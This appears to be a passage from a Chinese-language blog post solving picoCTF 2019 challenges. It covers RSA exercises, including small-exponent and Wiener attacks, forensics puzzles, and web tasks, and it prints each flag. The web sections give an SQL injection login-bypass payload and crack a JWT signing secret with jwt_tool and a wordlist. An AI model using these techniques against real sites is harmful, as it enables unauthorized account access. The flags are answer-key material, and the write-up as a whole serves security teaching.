TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">n: 4636878989</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第二题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 54269</span><br><span class="line">n : 5051846941</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">q: 93089</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p><p>第三题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">e : 3</span><br><span class="line">n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p><p>第四题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 66347</span><br><span class="line">p : 12611</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">totient(n): 836623060</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p><p>第五题</p><blockquote><p>Using the formula: c=plaintext^e mod n.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span><br><span class="line">e : 3</span><br><span class="line">n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">ciphertext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第六题</p><blockquote><p>This operation cannot be performed because p and q are not there</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span><br><span class="line">e : 3</span><br><span class="line">n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第七题</p><blockquote><p>For this we need to use the formula d=e^-1 mod ((p-1)(q-1)).Type (from Crypto.Util.number import *) in python.<br>Now type inverse(e,((p-1)(q-1))) by this you will get the mod.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span><br><span class="line">p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span><br><span class="line">e : 65537</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">d</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第八题</p><blockquote><p>First find ‘q’, then find and then find ‘d’ using the formula:d=e^-1 mod toitent(n). After finding d use the formula m=cyphertext^d mod n or you can also use pow(cyphertext,d,n).</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span><br><span class="line">ciphertext : 3001133423508155019342391181454969453683740998389305521868482065953685989583037773702319581717484580966593370778920602258110457396723632087223210560766860657023257472172328220084386229851941678615818536289364033769762938914666434052719653085203028823631950908006150453932488069330802006070658787154818367594933024991778763357876382724018717890178006250599003585272226771381223645294365192346693302207328966906968620673419237444014642963102675933287390856161621142811266283239380789957372689818205738309791091491858305530388074249507780688913259911773093289575133704279048285836964311807507701403508531667913455534667</span><br><span class="line">e : 65537</span><br><span class="line">n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">plaintext: 14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893</span><br><span class="line">Outstanding move!!!</span><br><span class="line">If you convert the last plaintext to a hex number, then ascii, you&apos;ll find what you need! ;)</span><br></pre></td></tr></table></figure><p>最后步骤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)</span><br><span class="line"><span class="string">'0x7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;wA8_th4t$_ill3aGal..o1828d357&#125;'</span></span><br></pre></td></tr></table></figure></p><p><code>picoCTF{wA8_th4t$_ill3aGal..o1828d357}</code></p><h2 id="miniRSA-Points-300"><a href="#miniRSA-Points-300" class="headerlink" title="miniRSA - Points: 300"></a>miniRSA - Points: 300</h2><blockquote><p>Lets decrypt this: ciphertext? Something seems a bit small<br>Hints: RSA tutorial<a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RSA_(cryptosystem)</a>)<br>How could having too small an e affect the security of this 2048 bit key?<br>Make sure you dont lose precision, the numbers are pretty big (besides the e value)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br></pre></td></tr></table></figure><p>e为3时最常见的指数是65537,直接调用gmpy2库解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import gmpy2</span><br><span class="line">&gt;&gt;&gt; from gmpy2 import mpz</span><br><span class="line">&gt;&gt;&gt; x=2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br><span class="line">&gt;&gt;&gt; gmpy2.iroot(x,3)</span><br><span class="line">(mpz(13016382529449106065894479374027604750406953699090365388202785764091466430362237L), True)</span><br><span class="line">&gt;&gt;&gt; hex(13016382529449106065894479374027604750406953699090365388202785764091466430362237)</span><br><span class="line"><span class="string">'0x7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;n33d_a_lArg3r_e_1dcea0a2&#125;'</span></span><br></pre></td></tr></table></figure></p><p>picoCTF{n33d_a_lArg3r_e_1dcea0a2}</p><h2 id="b00tl3gRSA2-Points-400"><a href="#b00tl3gRSA2-Points-400" class="headerlink" title="b00tl3gRSA2 - Points: 400"></a>b00tl3gRSA2 - Points: 400</h2><blockquote><p>In RSA d is alot bigger than e, why dont we use d to encrypt instead of e? Connect with nc 2019shell1.picoctf.com 25894.<br>HInts: What is e generally?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 2907769365419444727724175525671479981034192273204157726490522975279978593460225718961335784293417741607844791576565752988761172584273921395504823687108723176653809711169572251090119440733253837992509444186223539794384266837974042900938754540469801677256722806361322725611718921210360254805056231994475857991</span><br><span class="line">n: 104632934684607347040516088721842504035835154723230245213808635990738949032699364042811143172516764890701695806265159972897211958854001703738425521421300793289421837444580747279427459325350271662864746224966534428867373786235636261074057852584587383908394377990543646006651631195118177751615662277651780552659</span><br><span class="line">e: 55055344609365698084214364458001081971584593061566317896043105474840806238363136390928780096145202259654199584711655652614362225752191811521977900738394126069944440703568029472306324641124595496813413986093178525922575816469353968511903928979464226600653482605581664396016087501078623594868326395140317882593</span><br></pre></td></tr></table></figure><p>e很大容易造成维纳攻击,解题过程:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/CTF-RSA-tool<span class="comment"># touch rsa.txt</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># vi rsa.txt //按照格式把 n e c 写入</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># python solve.py -i rsa.txt</span></span><br><span class="line">INFO: picoCTF&#123;bad_1d3a5_3468581&#125;</span><br></pre></td></tr></table></figure></p><p>picoCTF{bad_1d3a5_3468581}</p><h1 id="杂项-Forensics"><a href="#杂项-Forensics" class="headerlink" title="杂项(Forensics)"></a>杂项(Forensics)</h1><h2 id="WhitePages-Points-250"><a href="#WhitePages-Points-250" class="headerlink" title="WhitePages - Points: 250"></a>WhitePages - Points: 250</h2><blockquote><p>I stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!</p></blockquote><p>用sublime打开,替换里面的不明字符和空格成0和1,再进行转换</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{not_all_spaces_are_created_equal_f006c045f6b402ce4bc749dc7a262380}</p><h2 id="like1000-Points-250"><a href="#like1000-Points-250" class="headerlink" title="like1000 - Points: 250"></a>like1000 - Points: 250</h2><blockquote><p>This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.<br>Hints: Try and script this, it’ll save you alot of time</p></blockquote><p>要解压1000次,并把里面的内容写入一个文件,用脚本解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure><p>得到最后一层的flag图片<br><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>picoCTF{l0t5_0f_TAR5}</p><h2 id="shark-on-wire-2-Points-300"><a href="#shark-on-wire-2-Points-300" class="headerlink" title="shark on wire 2 - Points: 300"></a>shark on wire 2 - Points: 300</h2><blockquote><p>We found this packet capture. Recover the flag that was pilfered from the network. You can also find the file in /problems/shark-on-wire-2_0_3e92bfbdb2f6d0e25b8d019453fdbf07.</p></blockquote><p>在观察这些流之后,发现有效负载从UDP流32开始,过滤源IP后可以看到类似的包,唯一改变的就是端口号,都减去5000后转为字符串就可以得到flag</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>这里用的是大佬的bash脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">chr</span></span>() &#123;</span><br><span class="line">  <span class="built_in">printf</span> \\$(<span class="built_in">printf</span> <span class="string">'%03o'</span> <span class="variable">$1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(tshark -r ./capture.pcap -T fields -e udp.srcport -Y <span class="string">"ip.src == 10.0.0.66"</span>); <span class="keyword">do</span></span><br><span class="line">    chr $(( <span class="variable">$&#123;p&#125;</span> - 5000 ))</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure><p>picoCTF{p1LLf3r3d_data_v1a_st3g0}</p><h1 id="WEB应用-Web-Exploitation"><a href="#WEB应用-Web-Exploitation" class="headerlink" title="WEB应用(Web Exploitation)"></a>WEB应用(Web Exploitation)</h1><h2 id="Irish-Name-Repo-2-Points-350"><a href="#Irish-Name-Repo-2-Points-350" class="headerlink" title="Irish-Name-Repo 2 - Points: 350"></a>Irish-Name-Repo 2 - Points: 350</h2><blockquote><p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/40968/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/40968/</a> (link). Someone has bypassed the login before, and now it’s being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:40968" target="_blank" rel="noopener">http://2019shell1.picoctf.com:40968</a><br>Hints: The password is being filtered.</p></blockquote><p>左边的导航栏有 Admin login,进入管理员登陆页面,检查页面元素在password下面有个不显示的debug值,把debug值改成1,再进行sql注入</p><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>发现反弹回来的是个sql注入查询语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL query: SELECT * FROM users WHERE name=&apos;&apos; AND password=&apos;&apos;</span><br></pre></td></tr></table></figure><p>payload: <code>?username=admin&#39;--&amp;password=1&amp;debug=1</code><br>返回的mysql查询语句是: <code>SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;1&#39;</code></p><p>会把and后面的语句注释掉进行无密码登录</p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{m0R3_SQL_plz_daf42601}</p><h2 id="Irish-Name-Repo-3-Points-400"><a href="#Irish-Name-Repo-3-Points-400" class="headerlink" title="Irish-Name-Repo 3 - Points: 400"></a>Irish-Name-Repo 3 - Points: 400</h2><blockquote><p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/47247/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47247/</a> (link) or <a href="http://2019shell1.picoctf.com:47247" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47247</a>. Try to see if you can login as admin!<br>Hints: Seems like the password is encrypted.</p></blockquote><p>依旧是adminlogin页面,debug改为1,尝试admin登陆</p><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>是个凯撒位移13位的加密,可以构造or查询语句</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p><h2 id="JaWT-Scratchpad-Points-400"><a href="#JaWT-Scratchpad-Points-400" class="headerlink" title="JaWT Scratchpad - Points: 400"></a>JaWT Scratchpad - Points: 400</h2><blockquote><p>Check the admin scratchpad! <a href="https://2019shell1.picoctf.com/problem/37903/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37903/</a> or <a href="http://2019shell1.picoctf.com:37903" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37903</a><br>Hints: What is that cookie?<br>Have you heard of JWT?</p></blockquote><p>我是第一次接触到JaWT和JWT,对于这道题是参考了Ch3lLIST4师傅的wp</p><p>简单了解下JWT(JSON Web Token)由三部分组成，分别是头信息、有效载荷、签名，中间以（.）分隔</p><p>header部分由令牌类型和散列算法组成 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload部分由claims构成,经过Base64Url编码，形成JWT的第二部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>签名令牌的信息虽然可以防止篡改,但任何人都可以读取(除非加密),所以不要将敏感信息放入到Payload或Header元素中,换言之我们就可以通过在cookie中写入令牌来进行伪身份访问<br>Signature部分需要用到编码的Header,编码的Payload,秘钥,Header中指定的算法,并对其进行签名,在经过base64-url编码后会形成由三个.结束的base64字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>我以Damya的用户名登陆jwt,在cookie里发现了名为jwt的签名令牌<br><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU</span><br></pre></td></tr></table></figure><p>初步解码可以得到header和payload部分,于是使用jwttool工具爆剩下的信息,因为页面提示了john,可能是要使用john的字典…然后在师傅的页面看到是kali的rockyou.txt,我正好有就不下john了,太大了<br><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2ze5rmf8lyj1geahh44hZ:~/jwt_tool<span class="comment"># python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU -d ~/wordlists/rockyou.txt</span></span><br><span class="line"></span><br><span class="line">   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ </span><br><span class="line">   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |</span><br><span class="line">      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |</span><br><span class="line">      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |</span><br><span class="line">$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |</span><br><span class="line">$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |</span><br><span class="line">\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |</span><br><span class="line"> \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|</span><br><span class="line"> Version 1.3.2                \______|                           </span><br><span class="line"></span><br><span class="line">=====================</span><br><span class="line">Decoded Token Values:</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">Token header values:</span><br><span class="line">[+] typ = JWT</span><br><span class="line">[+] alg = HS256</span><br><span class="line"></span><br><span class="line">Token payload values:</span><br><span class="line">[+] user = Damya</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">JWT common timestamps:</span><br><span class="line">iat = IssuedAt</span><br><span class="line">exp = Expires</span><br><span class="line">nbf = NotBefore</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"><span class="comment">#  Options:                                            #</span></span><br><span class="line"><span class="comment">#                ==== TAMPERING ====                   #</span></span><br><span class="line"><span class="comment">#  1: Tamper with JWT data (multiple signing options)  #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#             ==== VULNERABILITIES ====                #</span></span><br><span class="line"><span class="comment">#  2: Check for the "none" algorithm vulnerability     #</span></span><br><span class="line"><span class="comment">#  3: Check for HS/RSA key confusion vulnerability     #</span></span><br><span class="line"><span class="comment">#  4: Check for JWKS key injection vulnerability       #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== CRACKING/GUESSING ====               #</span></span><br><span class="line"><span class="comment">#  5: Check HS signature against a key (password)      #</span></span><br><span class="line"><span class="comment">#  6: Check HS signature against key file              #</span></span><br><span class="line"><span class="comment">#  7: Crack signature with supplied dictionary file    #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#            ==== RSA KEY FUNCTIONS ====               #</span></span><br><span class="line"><span class="comment">#  8: Verify RSA signature against a Public Key        #</span></span><br><span class="line"><span class="comment">#                                                      #</span></span><br><span class="line"><span class="comment">#  0: Quit                                             #</span></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"></span><br><span class="line">Please make a selection (1-6)</span><br><span class="line">&gt; 7</span><br><span class="line"></span><br><span class="line">Loading key dictionary...</span><br><span class="line">File loaded: /root/wordlists/rockyou.txt</span><br><span class="line">Testing passwords <span class="keyword">in</span> 